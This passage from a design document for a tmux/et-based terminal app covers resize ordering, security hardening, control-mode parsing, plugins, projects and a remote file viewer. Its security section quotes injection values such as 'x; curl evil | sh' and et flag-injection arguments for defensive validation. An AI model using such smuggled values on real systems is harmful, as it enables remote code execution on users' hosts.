- **Fallback shell/cwd** (no-tmux path only): explicit override → `$SHELL` → `/bin/bash`, started as a
  **login shell** (`-l`) in `$HOME`.
- **Tests are deliberately NOT `#[ignore]`d** (`tests/live_local_tmux.rs`): they need no remote host or
  credentials and skip cleanly when tmux is absent, so local durability is checkable in CI. TC-LT1
  attach/Ready/topology, **TC-LT2 the durability property** (write a marker, kill the client as if the
  app quit, reattach a *new* backend, marker replays), TC-LT3 the stuck-connecting fix, TC-LT4 plain
  mode really runs under tmux, TC-LT5 a unicode window name survives intact. Mutation-verified:
  dropping `-CC` fails LT1/LT2/LT5; dropping `new-session -A` fails LT2.

### 5.4 Resize correctness & reattach ordering

- `@xterm/addon-fit` computes cols/rows from the container.
- Send to pty on: window resize, sidebar toggle, tab switch, and **reattach**.
- **Reattach ordering contract** (avoids garbled/clipped redraw): the real size source is
  the **et pty winsize** (spawn the pty at the fitted `{cols, rows}`) plus tmux's default
  **`window-size latest`** so the window tracks the newest client — **not** `-x/-y`, which
  are inert on attach (§5.1). So: **fit the container → spawn the pty at that size**; do not
  rely on the launch command's flags to size the window.
- Control-mode backfill follows the same rule: **fit xterm → resize tmux → capture cells + cursor →
  repaint → release buffered input**. The backend does not capture at its provisional attach size.
  This keeps the shell prompt and its cursor on the same row when the first command is echoed.
- `create_session(id)` is a replacement operation when that id is already live. This matters in
  `tauri dev`, where a frontend hot reload keeps Rust `AppState` alive but initializes the renderer
  again: the old backend must be closed before its replacement starts, or two reconnect supervisors
  detach each other and duplicate terminal output.
- **Only one Buoy process may own persisted sessions.** A second app process restoring the same
  session also launches tmux with `new-session -D`; each client then detaches the other and both
  supervisors back off and reattach forever. The single-instance plugin is therefore registered
  before every other Tauri plugin. A later launch asks the existing process to show, unminimize, and
  focus its main window, then exits before it can create a backend.
- Do **not** key a corrective resize off "first `onData`": the first bytes from a fresh et
  are typically the ssh/et connection banner or et's stdout diagnostics (§5.1), **not**
  tmux's redraw, so resizing then can fire before tmux attaches. If a post-attach corrective
  resize is needed (window changed size during connect, or `window-size` isn't `latest`),
  key it off a short settle debounce after attach and an explicit `pty.resize()`.

---

## 6. Security

### 6.1 Remote command injection (the real risk — must fix before any session CRUD ships)

Two distinct injection surfaces, closed differently. node-pty `spawn` passes an **argv
array (no local shell)**, so classic *local* shell injection is not the issue — but two
real vectors remain:

**(a) Remote shell injection via `session` (the `-c` payload) AND tmux argv-flag injection
via `session`.** `-c` is a shell string executed on the *remote*, and `session` is also
passed into **tmux argv** (`new-session -s <s>`). Two hazards: shell metacharacters
(`x; curl evil | sh`, `$(...)`) → remote code execution; and a **leading `-`** (e.g. `-X`,
`-D`) → tmux parses it as a *flag*, not a name (verified: `tmux new -s -X` creates a session
literally named `-X` only by getopt accident; fragile and order-dependent). **Closed by
charset validation:** `session` must match **`^[A-Za-z0-9][A-Za-z0-9_-]*$`** — first char
**alphanumeric** (rejects leading `-`), and `.` **excluded** (collides with tmux target
syntax `session:window.pane`). After this, the token has no shell metacharacters and can't
be a flag.

**(b) argv flag-injection via `host`/`user`/`port`.** `host` is passed as et's
**positional argv**, and et parses options from argv, so a `host` beginning with `-` becomes
a flag: `-x` silently kills the user's other et sessions; `--jumphost=…`, `-t 9999:evil:22`,
`-c 'cmd'` all reachable. Mitigations:
- **Decompose, don't pass a raw positional (lead with this).** Parse `user@host:port` into
  sub-fields in main and pass **`-u <user> -p <port>`** as separate validated options; this
  sidesteps most of the grammar problem. Never forward a raw user-controlled field as a
  positional.
- **Pass the host after a `--` end-of-flags marker** as free defense-in-depth: et **does**
  honor `--` (verified: `et -c 'echo hi' -- -x` treats `-x` as the host), so a residual
  leading-`-` host can't be parsed as a flag. **Ordering caveat (verified):** `--` halts et
  flag parsing entirely, so **all et options — including `-c <payload>` and `-t` — MUST come
  before `--`, and `<host>` is the only token after it.** Putting `-c` after `--` silently
  drops the payload (§5.1).
- **Grammar per sub-field, with explicit leading-`-` reject:**
  - `user`: `^[A-Za-z0-9][A-Za-z0-9._-]*$`
  - `port`: numeric **1–65535** (regex `[0-9]{1,5}` is not enough — reject `0`, `99999`).
  - `host`: `^[A-Za-z0-9][A-Za-z0-9.-]*$` for hostnames/IPv4, **plus an explicit IPv6
    branch** — et supports IPv6 (`et --help`), but a naive grammar with a single `:` port
    separator **rejects all IPv6** (`::1`, `2001:db8::1`). Accept bare/bracketed IPv6 forms,
    but **always strip to the bare address and route the port to `-p`** — never pass a
    bracketed-with-port token: verified that `et '[::1]:2022'` mis-parses as
    `[::1]:2022:2022` (et appends its own default port). et also requires `-p` for
    `::`-abbreviated addresses. Reject a leading `-` in every sub-field.

**Both surfaces, common rules:**
- **The renderer never passes raw argv or command strings.** The contextBridge exposes only
  `{host, session}` (+ opaque session `id`); the **main process** parses/validates/builds
  all argv.
- **Re-validate the persisted JSON on load** (§5.2) — treat it as untrusted input.

### 6.2 SSH / auth handling (previously unspecified — a gap)

- et bootstraps over ssh. We rely on the user's existing ssh config / agent; **the app
  stores no credentials and no private keys.**
- **`-f/--forward-ssh-agent` is opt-in only, never default.** Agent forwarding exposes the
  local agent socket to the remote host; a compromised/hostile remote can use it to
  authenticate as the user elsewhere. Off by default; per-host toggle with a warning.
- Do not write host/session secrets to logs. Redact `-c` payloads if command logging is added.

### 6.3 Electron hardening

- `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true`.
- **Preload** exposes a narrow `window.terminalAPI` via `contextBridge`:
  `write(id, data)`, `onData(id, cb)`, `resize(id, cols, rows)`, `ackWrite(id)` (§4.1),
  and session CRUD keyed by `{host, session}` — **no free-form `spawn(argv)`**.
- node-pty stays in **main**, reached only over IPC.
- **IPC ordering & authorization:** use **one channel per session id** so pty bytes,
  `write`, and `resize` for a session are ordered w.r.t. each other (cross-session ordering
  is not needed). Single-user local app, so any renderer code may drive any session id
  today; **before multi-window (§9 Q7)**, add a per-window capability check so a window can
  only address sessions it owns.

---

## 7. The Swappable Seam — cut at the transport level, not the TS interface

**Correcting an earlier overclaim:** a TypeScript `TerminalView` interface does **not**
make the §8 native-renderer swap "contained." That interface lives in the Chromium
renderer; a Rust + wgpu + `alacritty_terminal` renderer draws to a **native GPU
surface/window**, not a DOM `<canvas>` a JS class can implement. Realizing §8 means a
native child window composited into/over the Electron window (or leaving Electron
entirely) — the web layout no longer owns the terminal rectangle, so a TS `TerminalView`
would be **discarded, not reused**. Selling it as a contained swap is wishful.

**The seam that actually survives a renderer change is the transport contract**, because
it is renderer-agnostic by construction:

> **Per session, over IPC:** pty output down; input up; `{cols, rows}` resize; write-ACK
> for backpressure (§4.1); lifecycle events (spawn/exit/state). This contract is identical
> whether the far end is an xterm.js `<div>` or a native surface. (Payload type: `string`
> in v1 — see the node-pty note below; a `Uint8Array` variant is the post-fork target.)

The sidebar / session list / respawn supervisor / persistence depend **only on this
transport contract + `{host, session}` model** — never on xterm.js. (They were never
coupled to the renderer, which is *why* they survive a swap — the TS view boundary gets no
credit for that.)

Within Electron, a convenience TS interface is still fine for xterm ↔ another **web**
renderer (e.g. DOM-renderer fallback for background panes, §3). It must be richer than the first
draft — a real terminal needs more than write/resize:

```ts
interface WebTerminalView {                 // web-renderer-only; NOT the native-swap seam
  write(data: string, ack?: () => void): void;   // v1: string (node-pty's type); ACK §4.1
  onInput(cb: (data: string) => void): void;     // v1: string; Uint8Array is post-fork target
  resize(cols: number, rows: number): void;
  onResizeRequest(cb: (cols: number, rows: number) => void): void; // fit → pty (§5.4)
  focus(): void;
  scrollback: { clear(): void; toLine(n: number): void };
  selection: { get(): string; clear(): void };
  setTheme(t: Theme): void; setFont(f: Font): void;
  onTitle(cb: (t: string) => void): void;  onBell(cb: () => void): void;
  dispose(): void;
}
```

- Day one: `XtermTerminalView implements WebTerminalView`.
- **Byte fidelity — reconciled with node-pty (§3).** By default node-pty's `onData` delivers
  an already-decoded `string` (via an internal `StringDecoder` that handles multibyte
  chunk-boundary splits). Raw bytes **are** available — spawn with `encoding: null` and
  `onData` delivers a `Buffer` (no fork needed). **v1 deliberately types the boundary as
  `string`** and uses the default utf8 StringDecoder: it gives chunk-boundary safety for
  free and matches xterm.js/`pty.write`. If genuine non-UTF8 byte fidelity is ever needed,
  switch node-pty to `encoding: null` and type the boundary `Uint8Array` — a config change,
  not a fork. (Do **not** derive bytes via `Buffer.from(decodedString)` — that re-encodes as
  UTF-8 and corrupts the very non-UTF8 bytes you wanted.)
- A native renderer (§8) implements the **transport contract**, not this TS interface.

---

## 8. Known Limitations & Migration Trigger

### xterm.js limitations

- **Throughput** — addressed as a v1 correctness requirement via backpressure (§4.1), not
  deferred. Without it, output is *discarded* past the ~50MB write buffer, not merely slow.
- **WebGL context cap** — a *routine* constraint here, not a rare fallback: Chromium caps
  live WebGL contexts (~8–16, LRU-evicted), so many sessions ⇒ background panes lose their
  context. Mitigation: WebGL for the focused pane only; **DOM renderer** (or disposed WebGL
  addon) for background panes — the canvas addon is **no longer part of current xterm.js**,
  so DOM is the only non-WebGL renderer (§3). Still handle `webglcontextlost` defensively.
- **Ligatures**: addon-based, imperfect (interacts awkwardly with WebGL).
- **Images**: Sixel via addon; iTerm/Kitty image protocols not first-class.
- **Electron tax**: Chromium memory/CPU overhead.

### Migration path — this is a REWRITE of the render layer, not a "contained swap"

Per §7: replacing xterm.js with a **native Rust + wgpu + `alacritty_terminal`** renderer is
**not** implementing a TS interface — it means rendering the terminal in a native surface,
a new IPC boundary, and re-solving focus / resize / IME / clipboard / scrollback against a
non-DOM surface. **Budget it as a full native rewrite, not a swap.** (The "native child
window composited into the Electron window" idea is a trap: Electron's BrowserWindow
compositor does not cleanly host a foreign GPU surface, and the transparent-overlay
workaround breaks DOM z-order vs. the sidebar, per-monitor DPI, input-focus routing, and
multi-window. The realistic path is **dropping Electron for a native/Tauri shell**.)

What *does* carry over: the sidebar / session / respawn / persistence code, because it
depends only on the **transport contract** (§7), not the renderer. That is the real,
limited benefit — do not overstate it.

Reference implementation to study: **Rio terminal** (`alacritty_terminal` + `wgpu` +
`rio-window` [a winit fork, not winit directly] + the `sugarloaf` render crate,
cross-platform).

---

## 9. Prerequisites & Open Questions

### 9.0 Hard prerequisite — validate BEFORE Milestone 2
- **et must be installable on the target hosts.** et requires ssh reachability + `etserver`
  running + an open TCP port (default 2022). On locked-down/managed hosts where you cannot
  install `etserver`, the design degrades to `ssh`+`autossh`, which gives **no in-session
  TCP resumption** — a materially different (weaker) product. **Confirm et installability
  against the actual hosts before building the remote layer.**
- **The connection layer must be pluggable from the start.** The session/persistence model
  differs per backend (et vs mosh vs ssh+autossh), so model it as an interface behind
  `{host, session}`, not as hardcoded `et` argv.
- **The OOB channel (§5.2) needs a LOCAL `tmux` binary + unix-socket support** to query the
  forwarded remote socket. Consequences: (a) **Windows** has no native tmux and differing
  unix-socket semantics — so on Windows the OOB channel is unavailable and the app must fall
  back to **timeout-only connect-detection with no lost-session detection**, or use `-CC`,
  or v1 scopes to **macOS/Linux only**; (b) even on macOS/Linux the **local tmux
  protocol version must match the remote's** (§5.2) — add both to setup docs.

### Open questions
1. **Connection layer**: `et` (default) vs `mosh` vs `ssh`+`autossh`? → gated on 9.0.
2. **Frontend**: React+TS (default) vs plain TS?
3. **Scaffold**: electron-vite (default) vs Electron Forge vs hand-rolled?
4. **Multi-pane / splits**: app owns splits (tabs of single terminals) or tmux owns splits
   inside one pane? (Recommendation: app owns tabs/sessions, tmux owns in-session splits —
   avoid two multiplexers fighting over layout.)
5. **Target platforms** for v1: macOS only, or all three desktop OSes from the start?
6. **Version skew**: a stale `etserver` may refuse a newer et client; **and** local vs
   remote **tmux protocol** must match for the OOB channel (§5.2). Note both in setup docs.
7. **Multi-window**: single window (v1 default) or multiple? Deferred; gates the
   per-session IPC capability check (§6.3) and the native-renderer path (§8).

---

## 10. Rough Milestones

0. **Empirically characterize `et` by hand** (§9.0): run the canonical command (§5.1)
   against a real host **inside a real terminal/pty** (a piped/redirected run fails with
   "open terminal failed: not a terminal" — verified). **Capture exit code AND output stream
   for each case: in-terminal detach (`Ctrl-b d`), remote shell exit, ssh auth failure,
   `tmux`-missing, host-down** — the §5.1 "exit-0 = intentional, no respawn" rule and the
   auth-cap depend on this. Also confirm the `-t` socket forward lets a local `tmux -S`
   query the remote (§5.2). (Already verified offline: host-down/refused → exit 1 +
   identical stdout; `-x/-y` inert on attach; `tmux attach -D`/`-o` invalid; `window-size`
   defaults to `latest`; `--` honored by et; `session_created` persists across `new -A -D`.)
1. **Skeleton**: Electron + xterm.js + node-pty; one local shell renders, resize works,
   **backpressure/watermarks in place (§4.1)** — validate with `cat` of a large file
   (assert no discard/wedge; observe et-side RSS, §11).
2. **Remote + bounded reconnect**: pty spawns the **canonical command** (§5.1) at the fitted
   pty size (§5.4), validated/decomposed inputs (§6); supervisor with **exit-0=no-respawn**
   (gated on no-respawn-in-flight), capped backoff, **lifetime auth-attempt cap** (excluding
   watchdog kills), timer cancellation, PID-fingerprint local + `-D` remote orphan handling
   (§5.1). Verify against a **fake connection backend** (§11): no hot-loop, detach lets you
   leave, no double-attach, no auth-storm, no watchdog livelock.
3. **OOB control channel + sidebar**: forward the remote tmux socket over et (`-t
   sock:sock`, §5.2) and derive `connecting→connected` from an OOB `list-clients`/query —
   **not** first pty data (§5.3/§5.4). Then session list, add/focus/remove/rename, **state
   machine (§5.3)**. (This channel is a prerequisite for M4; if the §1 `-CC` spike won, it
   replaces this.)
4. **Persistence**: disk-backed session list (re-validated on load), lazy restore on launch,
   detect-lost-session via persisted remote `#{session_created}` over the OOB channel (§5.2).
5. **Polish**: focused-pane WebGL + background DOM renderer (§3), `webglcontextlost` handling,
   keybindings, theming.
6. **(Later, gated on measured need)** Native renderer — a render-layer *rewrite* (§8),
   reusing only the transport-contract-coupled code.

---

## 11. Testing & Observability (the reliability core needs both)

The app's entire justification is *stability*, so the supervisor (§5.1) must be testable
and its decisions observable — otherwise "stable" is unmeasured.

### Testing
- **Injectable connection-layer interface** (already required for pluggability, §9.0): the
  supervisor depends on an abstract `ConnectionBackend`, not on `et` directly. A **fake
  backend** lets tests drive exit timing/codes, simulate drops, dead hosts, detach, and
  slow teardown — asserting: no hot-loop on a dead host, backoff caps then `dead`,
  intentional-close cancels pending timers, no respawn after close, no double-attach.
- **Backpressure test**: feed a synthetic firehose through the fake backend; assert the
  xterm.js buffer never overflows and `pause`/`resume` toggle at the watermarks.
- **Input-validation tests** (§6): reject hosts with leading `-`, session names with
  metacharacters or `.`, malformed persisted JSON.

### Observability
- **Structured event log** for every supervisor decision (spawn, exit observed, backoff
  scheduled/cancelled, dead, retry) — this is the runtime channel for *why* a session died,
  since et's own diagnostics are unparseable stdout (§5.1). Optionally enrich with et's
  `-l/--logtostdout` side-channel log.
- **Per-session metrics**: reconnect count, current backoff, IPC queue depth / unacked
  bytes (§4.1), and et-client memory (the unbounded-buffer risk from §4.1).
- Surface `dead`/`reconnecting`/lost-session states in the sidebar (§5.3) with the cause.

---

## 12. Control Mode (`tmux -CC`) — native-tab view (VERIFIED against tmux 3.5a on a live host)

### Goal
Make a remote session look like a **native terminal** (own tabs/splits, no tmux status bar,
no prefix key) — the cmux `ssh-tmux` experience — WITHOUT changing session persistence.

### Key facts (verified on the target host, not assumed)
- **Control mode is per-CLIENT, not per-session.** The same tmux session can be attached
  normally or with `-CC`; switch a session between modes by detach/reattach with no data
  loss. So `-CC` is an *optional view* on sessions we already manage — not a rewrite.
  (Verified: created a session normally, attached `-CC`, reattached normally; work survived.)
- **Requires tmux >= 3.2.** The probe (probeTmux) detects version; offer `-CC` only where
  supported, else fall back to the normal-mode `SshTmuxBackend`.
- **Input goes to tmux's COMMAND interpreter, not the shell.** Writing raw `echo x` to a
  `-CC` stream yields `parse error: unknown command: echo`. Shell input must be sent via
  `send-keys -t %<pane> "..." Enter` (verified). This is the #1 gotcha.

### The wire protocol (captured from tmux 3.5a — ground truth)
Stream opens with a DCS marker (ESC P 1000 p), then CRLF-terminated lines:
- `%begin <ts> <cmd#> <flags>` ... `%end|%error <ts> <cmd#> <flags>` — command reply block
- `%output %<pane> <data>` — pane output; `<data>` is OCTAL-ESCAPED (octal ESC/CR/LF etc.)
- `%window-add @<win>` / `%window-close @<win>` — window (our TAB) added/removed
- `%window-renamed @<win> <name>` — tab title
- `%window-pane-changed @<win> %<pane>` ; `%session-changed $<s> <name>`
- `%session-window-changed $<s> @<win>` ; `%sessions-changed`
- `%layout-change @<win> <layout>` — e.g. `419a,80x24,0,0[80x12,0,0,1,80x11,0,13,2]`
- `%exit [<reason>]` — control client should exit

Notes: `%output` payload is octal-escaped (octal 033=ESC, 015=CR, 012=LF) — un-escape to raw
bytes before `term.write()`. Layout string = `<checksum>,<WxH>,<X>,<Y>` with `[...]` =
left/right split, `{...}` = top/bottom split, leaf ends in the pane id -> parse to a tree.

### Architecture — a thin `ControlModeBackend` coordinator over focused units
`ControlModeBackend` is deliberately small: it wires parser events to the registry and emits
tagged data/window events. The mechanisms live in single-responsibility, individually
unit-tested collaborators, so the coordinator holds little state and each rule is testable alone:
- `ControlModeParser` (pure): bytes -> structured control events (paneOutput, window*, begin/end,
  exit).
- **`WindowRegistry` (pure): the single source of truth for topology.** Maps `pane -> window`,
  tracks the active window; `reconcile(rows)` against an authoritative `list-panes -s` listing
  returns the exact diff (added/removed/renamed/activeChanged/newlyMappedPanes). No IO.
- **`ReplyChannel` (pure): the request/response protocol.** Owns the pty command writes and a FIFO
  of one reply handler per command (+ a seeded handshake handler). `send(line, handler?)` /
  `onReply(ev)` give positional correlation — see below.
- **`tmuxKeys` (pure): shell input -> `send-keys` command lines** (line-splitting + literal
  escaping). Verified gotchas encoded once, tested in isolation.
- **`shared/tmuxSocket` (pure): the version-tagged socket name**, the one place the major-minor
  rule lives (used by main, ssh backend, and control backend so it can't drift).
- Launch argv (`buildControlModeSshArgs`): `ssh -tt -- host <tmux> -CC -L <sock> new-session -D -A
  -s <name>` (built on `buildSshArgs`, which validates host/session/etc.).
- `ControlModeBackend` (per SESSION) coordinates them:
  - **Topology by reconcile, not by ad-hoc signal handling.** ANY of `%window-add/close/renamed`,
    `%window-pane-changed`, `%session-window-changed`, `%layout-change` just triggers a
    (coalesced) `list-panes -s` refresh; its reply reconciles the registry and the backend emits
    exactly the window add/close/rename/active events that changed. This replaced a design that
    tried to apply each partial signal directly and raced (a new tab showing the previous tab's
    app; output mixing across tabs). A topology listing is recognized purely by CONTENT (every
    line `@win %pane a a name`), so it is never confused with scrollback capture text.
  - **Output is TAGGED with its window.** `%output %P` -> look up `P`'s window in the registry
    and emit `{window, pane, data}`. If `P` isn't mapped yet (output can race ahead of the
    listing on a brand-new window), buffer BY PANE and flush on the next reconcile — never guess.
    Filter tmux/screen's `ESC k title ESC \\` protocol as a per-pane byte stream before emitting:
    xterm.js does not implement that title sequence and otherwise renders its payload as a phantom
    command line after Enter. The filter retains state across `%output` chunk boundaries.
  - **Input & capture address a WINDOW, not a pane.** `send-keys -t @win` / `capture-pane -t @win`
    (tmux resolves the window's active pane). Verified on the host. This removed the async
    "query the pane id first" step whose gap let keystrokes land in the previously-active window.
  - **Replies correlate to commands POSITIONALLY (`ReplyChannel`).** tmux emits exactly one
    `%begin..%end` block per command, in submission order (verified: cmd# monotonic; one
    unsolicited handshake block at connect, absorbed by the seeded handler). Each `send` enqueues
    one reply handler; each reply block invokes the head. This replaced content-based routing,
    which desynced when a *fresh* window's capture reply was **empty** (indistinguishable from a
    command ack), so a later capture painted into the wrong tab — the "re-visited first tab becomes
    the old one" bug. Positional correlation binds each capture reply to the exact window it was
    requested for, empty or not.
  - resize -> `refresh-client -C <cols>x<rows>` (verified on 3.5a).
  - **Input gating lives ONLY in the backend.** It buffers input until ready and while the target
    window's capture/cursor repaint transaction is pending (attach settled, fast
    path 500ms after `%session-changed`; spawn-time fallback guarantees ready even if that signal
    never arrives), then replays in order. The renderer forwards keystrokes unconditionally and
    keeps `inputReady` purely as a status-line flag — no second buffer/timer (that duplication was
    removed).
  - **The renderer is a dumb view keyed by window** — it holds no pane/topology state; it just
    mirrors the backend's window events into tabs and routes `{window}`-tagged data to that tab.
    All backend `data` is normalized to `{data, window?, pane?}` at the supervisor, so main/renderer
    never type-sniff string-vs-object.
- **Version-tagged socket** `dtcc<major>-<minor>` (e.g. `dtcc3-7`): tmux's control protocol drifts
  across minor releases, so a 3.5 server + 3.7 client on one socket silently produces no output.
  Distinct sockets per major.minor keep incompatible versions from ever sharing a server.
- **Per-session transport toggle**: `mode: 'plain' | 'control'`. `plain` = current
  `SshTmuxBackend` (any tmux). `control` = `ControlModeBackend` (tmux >= 3.2). Persisted;
  switchable by detach/reattach. Default `plain`; offer `control` when the probe reports >= 3.2.

### Parser rules (the fiddly bits, from the capture)
- Buffer by CRLF lines; a line starting with `%` is a control line -> dispatch by keyword.
- `%output %<id> <rest>`: id is `%N`; `<rest>` is octal-escaped to end-of-line -> un-escape.
- `%begin`/`%end`/`%error` bracket command replies; correlate by `<cmd#>`; non-`%output`
  text between a `%begin` and its `%end` is the reply body (e.g. `list-windows`).
- `%exit` -> tear down the session view. Ignore unknown `%...` lines forward-compatibly.

### Milestones (spike first, then layer)
1. Single-pane spike: `-CC` attach, parse `%output %0` -> one xterm; input via `send-keys`;
   resize via `refresh-client -C`. Prove round-trip on the live host (echo a marker).
2. Command correlation: `%begin/%end/%error` state machine; unit-tested with captured fixtures.
3. Windows -> tabs: `%window-add/close/renamed` -> tab strip; switch active window.
4. Panes -> splits: parse `%layout-change`; render native splits; route per-pane output.
5. Polish: mouse, copy-mode/selection, bracketed paste (`paste-buffer -p`), title/bell.

### Testing
- Parser is PURE -> unit-test against CAPTURED real-byte fixtures: `%output` un-escaping,
  multi-line, `%window-*`, `%layout-change`, `%begin/%end/%error`.
- Live spike test (like `test/live-*.js`): drive a real `-CC` session; assert a `send-keys`
  marker round-trips through `%output`. Gated on tmux >= 3.2; plain-mode path unaffected.

---

## 13. Plugin framework (extension points)

A small, in-process extension framework so features are contributed, not hardcoded. First
extension point: **link matchers** (clickable URLs/paths and beyond).

### Architecture
- `ui/src/plugins.ts` — `PluginRegistry` (PURE, unit-tested): holds registered link
  plugins and a `findMatches(line)` engine (priority-ordered, non-overlapping).
- `ui/src/builtinPlugins.ts` — the built-in **url** and **path** plugins, written
  against the same public API a third party would use (examples as much as features).
- Renderer wires the registry into an xterm `registerLinkProvider` per terminal; a match's
  `activate` calls the plugin's `onClick(text, ctx)`.

### Public API (renderer global)
```js
// window.dtPlugins.registerLink(plugin) -> unregister()
window.dtPlugins.registerLink({
  name: 'jira',
  priority: 50,                 // higher wins on overlapping ranges (default 0)
  regex: /\b[A-Z]+-\d+\b/g,     // MUST be global (/g)
  onClick(text, ctx) {          // ctx = { meta, openExternal, copyText, setStatus }
    ctx.openExternal('https://jira.example.com/browse/' + text);
  },
});
```

### The `ctx` handed to onClick
- `meta` — the session's metadata (host, mode, …) so a handler knows if a path is remote.
- `openExternal(url)` — opens via the OS, **scheme-validated in main** (http/https/ftp/file/
  mailto only — terminal text is untrusted).
- `copyText(text)` — writes to the clipboard.
- `setStatus(msg)` — shows a message in the status bar.

### Built-in behavior
- **url**: opens http(s)/ftp/file (and bare `www.` → https) in the browser; refuses unsafe
  schemes.
- **path**: the terminal path is usually REMOTE (session is ssh+tmux), so the app can't open
  it locally in general — default action is **copy + status**. A plugin can register a
  higher-priority path matcher to override (e.g. open in a remote editor).

### Security
- Matching is on untrusted terminal text; handlers do only what `ctx` allows.
- `openExternal` is scheme-allowlisted in the MAIN process (defense-in-depth), not just the
  plugin — a malicious matcher still can't launch `javascript:`/arbitrary handlers.

### Future extension points (same registry pattern)
- output transformers, status-bar widgets, custom keybindings, per-session hooks.

---

## 14. Projects & multi-session (cmux-style)

Sidebar entries become **projects**; each project holds **multiple sessions (tabs)** that
**share one remote host + one connection**.

### Mapping (the whole design)
- **Project = one tmux session** on the host (`dt-<projectId>`, the container).
- **Session/tab = a tmux window** inside it.
- **One control-mode connection per project** multiplexes all windows.
This is cmux's model and reuses our control-mode window→tab events (§12 milestone 3).

### Data model (persisted)
```
Project { id, title, host, transport, tmuxPath, tmuxVersion,
          tmuxSession:'dt-<id>', activeWindow:'@N',
          windows:[{ tmuxWindow:'@N', title }] }
```
Persist PROJECTS, not windows — windows live on the tmux server and are restored on
reattach; cached window titles only pre-populate tab labels before reattach completes.
Existing single-session entries migrate to single-window projects (backward compatible).

### UI
- Left sidebar = **projects** (host + title + status). Reuses today's sidebar.
- Tab bar (top of terminal area) = **windows of the active project** (the §12 tab strip,
  promoted to primary UI). `+` = new session in the project.
- One xterm PER WINDOW, kept live; active tab shown, others hidden (generalizes per-view
  show/hide). Output routed by pane→window mapping from `%layout-change`.

### Operations (control channel)
| Action | tmux command | Effect |
|---|---|---|
| Open project | `new-session -A -D -s dt-<id>` (-CC) | `%window-add` per window → tabs |
| New session | `new-window -t dt-<id>` | `%window-add @N` → tab + fresh xterm |
| Switch tab | `select-window -t @N` | active window matches; show its xterm |
| Rename tab | `rename-window -t @N "t"` | `%window-renamed` → label |
| Close tab | `kill-window -t @N` | `%window-close` → drop tab + dispose xterm |

### Reconnect
Reattach the project's ONE tmux session (control mode). tmux replays `%window-add` for every
window + `%layout-change` → **all tabs rebuild automatically**; per-window `capture-pane`
back-fills each window's scrollback (§12 flow); active window from `%session-window-changed`.
The whole project (all tabs) returns from a single reattach. Input gating/`ready` apply per
window.

### Caveats & scope
- **Requires control mode** (tmux ≥ 3.2). Plain mode shows tmux's own window bar; a plain
  project degrades to one window (extra windows via tmux's UI).
- v1 assumes **one pane per window** (window↔pane 1:1). Multi-pane splits = milestone 4.

### Confirmed decisions
- **Tab model:** windows in ONE tmux session per project. One `-CC` connection.
- **Reconnect load:** back-fill the ACTIVE tab's scrollback immediately; lazy-load each other
  tab's history on first focus.
- **New session (`+`):** `new-window -c '#{pane_current_path}'` — start in the active tab's cwd.

### Incremental build plan
1. Data model + persistence: Project with windows; migrate existing entries.
2. Sidebar shows projects; clicking opens/focuses a project (control-mode connect).
3. Tab bar from `%window-*`; per-window xterm + output routing; switch/active.
4. New session (`new-window`) + close (`kill-window`) + rename (`rename-window`).
5. Reconnect: rebuild all tabs + active-tab scrollback (others lazy on focus).
6. (later) multi-pane splits (milestone 4).

---

## 15. Polymorphic tabs (extension seam)

Tabs are NOT hardwired to terminals. A tab holds a **`TabContent`** provided by a registered
**tab-kind** (reuses the §13 plugin registry). This lets future tabs host other content
(markdown, an in-app browser, dashboards) with no changes to the project/tab machinery —
only terminal tabs bind to the tmux backend.

### TabContent interface
```
TabContent {
  kind,                 // 'terminal' | future: 'markdown' | 'browser' | ...
  mount(container),     // render into the tab's element
  onData?(data),        // optional — terminals consume backend bytes; viewers may ignore
  resize?(cols, rows),  // optional
  focus?(),             // optional
  dispose(),
}
```

### Registering a tab-kind (public API)
```js
window.dtPlugins.registerTabKind({
  kind: 'markdown',
  create(spec, ctx) { /* return a TabContent */ },
});   // -> unregister()
```
- Built-in: **'terminal'** (`ui/src/terminalTab.ts`) wraps xterm.js as a TabContent —
  the reference implementation.
- The project/tab code creates content via `registry.createTabContent(kind, spec, ctx)` and
  manages mount/show-hide/dispose generically. A non-terminal kind simply doesn't wire to a
  pty/window.

NOTE: markdown/browser kinds are NOT designed here — only the seam exists so they can be
added later as plugins. §16 is the first concrete non-terminal kind (`fileviewer`).

---

## 16. File viewer — click a remote path → in-app preview + download (Tauri branch)

### Goal
Clicking a filesystem path in the terminal opens the file in an **in-app viewer tab** (text,
markdown, or image), with a **Download to local** button. The session is ssh+tmux, so the file
is almost always REMOTE; we fetch its bytes over a separate ssh exec and render locally. No
remote editing (deliberately out of scope); **Upload to override** is a future symmetric feature.
URLs are handled separately (§13 url plugin → browser); this section is about PATHS.

### Decisions (locked)
- **Presentation:** a **new tab** (reuses the §15 polymorphic tab machinery), not a split. Split
  view is a possible follow-up.
- **Day-one types:** **text**, **markdown** (rendered), **image**. Others → download-only panel.
  **Added later: HTML** (`.html`/`.htm`/`.xhtml`) — static by default, with an explicit per-file
  opt-in to run its scripts. See *HTML preview* and *Scripts* below.
- **Type detection:** by **extension** first (`.md`/`.markdown` → markdown; image exts → image;
  html exts → html; else text), with a **binary sniff** fallback (invalid-UTF-8 / NUL bytes → not
  text → treated as a downloadable blob, not rendered). The sniff runs **before** the html branch,
  so a binary blob named `.html` is never handed to the parser.
- **Size caps are TIERED by what happens to the bytes** (a single cap is wrong — the bottleneck
  is webview rendering, not the network):
  | Path | Cap | Why |
  |---|---|---|
  | text / markdown **render** | **1 MB** | DOM + markdown cost; larger stalls WKWebView |
  | image **decode** | **5 MB** | one decode to a `data:` URL |
  | **html render** | **5 MB** | native parser, not our MD path; self-contained files inline their images |
  | **download-to-local** | **50 MB** | bytes → disk, no rendering |
  Over the render cap → **don't render**; show "file is N MB, too large to preview" with the
  Download button still enabled. The remote fetch is bounded with `head -c <downloadCap>`.

### Flow
```
click path (path plugin) → ctx.openViewer(sessionId, path)
  → invoke('read_remote_file', {id, path})            [Rust: separate ssh exec, NOT the -CC channel]
  → { bytes(b64), size, truncated }                    [content base64 so images/binaries survive]
  → renderer: detect type, size-gate, open a 'fileviewer' tab
  → [Download to local] → invoke('save_file', {bytes, suggestedName})  [native dialog + write]
```

### Rust commands (main)
- **`read_remote_file(id, path) -> { data_b64, size, truncated }`**
  - Look up the session's validated `host`/`port`/`baseArgs` from the store (never trust the
    renderer for connection params).
  - **Injection-safe:** base64-encode the PATH itself so it never appears as unescaped shell text;
    the remote decodes it into a var and reads that. Content is base64-encoded on the wire so
    binary/UTF-8 both survive:
    ```
    ssh [opts] -- <host> 'p=$(echo <b64path>|base64 -d); head -c <cap+1> -- "$p" | base64'
    ```
